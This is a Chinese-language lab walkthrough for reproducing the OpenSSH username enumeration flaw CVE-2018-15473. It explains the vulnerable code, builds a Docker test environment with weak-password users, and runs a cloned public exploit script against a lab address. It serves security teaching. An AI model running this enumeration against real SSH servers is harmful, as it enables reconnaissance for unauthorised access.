# OpenSSH用户名枚举漏洞（CVE-2018-15473）
## 1.实验介绍
OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。

受影响版本：
OpenSSH >=2.3&&<=7.7

## 2.实验原理
以下是openssh代码：
```c
  87 static int
  88 userauth_pubkey(struct ssh *ssh)
  89 {
 ...
 101         if (!authctxt->valid) {
 102                 debug2("%s: disabled because of invalid user", __func__);
 103                 return 0;
 104         }
 105         if ((r = sshpkt_get_u8(ssh, &have_sig)) != 0 ||
 106             (r = sshpkt_get_cstring(ssh, &pkalg, NULL)) != 0 ||
 107             (r = sshpkt_get_string(ssh, &pkblob, &blen)) != 0)
 108                 fatal("%s: parse request failed: %s", __func__, ssh_err(r));
```
可以看出来，当用户不可用时，连接userauth_pubkey会直接返回，如果用户可用，则会进入下一个条件判断，调用fatal函数。所以在username可用于不可用两种情况下，可以看出来这个函数的返回是不同的。

## 3.实验准备
装有docker和docker-compose的服务器一台。
## 4.实验步骤
### 1）搭建漏洞环境
cd /root
mkdir openssh
cd openssh
vi Dockerfile
Dockerfile内容：
```file
FROM vulhub/openssh:7.7

LABEL maintainer="phithon <root@leavesongs.com>"

RUN set -ex \
    && adduser --home /home/vulhub --shell /bin/bash --disabled-password --gecos "" vulhub \
    && echo "vulhub:vulhub" | chpasswd \
    && adduser --home /home/example --shell /bin/bash --disabled-password --gecos "" example \
    && echo "example:123456" | chpasswd
```
vi docker-compose.yml
docker-compose.yml内容：
```file
version: '2'
services:
 sshd:
   build: .
   environment: 
    - ROOT_PASSWORD=vulhub
   ports:
    - "20022:22"
```
![](I:\work\截图\OpenSSH用户名枚举漏洞（CVE-2018-15473）\安装漏洞环境.png)

编译及启动一个运行OpenSSH 7.7p1的容器：
docker-compose build
docker-compose up -d
![](I:\work\截图\OpenSSH用户名枚举漏洞（CVE-2018-15473）\运行openssh容器.jpg)

需要安装两个python库
安装pycrypto
wget https://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.6.1.tar.gz
taz -zxvf pycrypto-2.6.1.tar.gz
cd pycrypto-2.6.1
python3 setup.py install

安装paramiko
pip3 install paramiko==2.4.1

### 2）使用poc复现漏洞
cd /root/openssh
git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit.git
cd CVE-2018-15473-Exploit
python3 sshUsernameEnumExploit.py --port 20022 --userList user.txt 192.168.32.11

![](I:\work\截图\OpenSSH用户名枚举漏洞（CVE-2018-15473）\运行结果.jpg)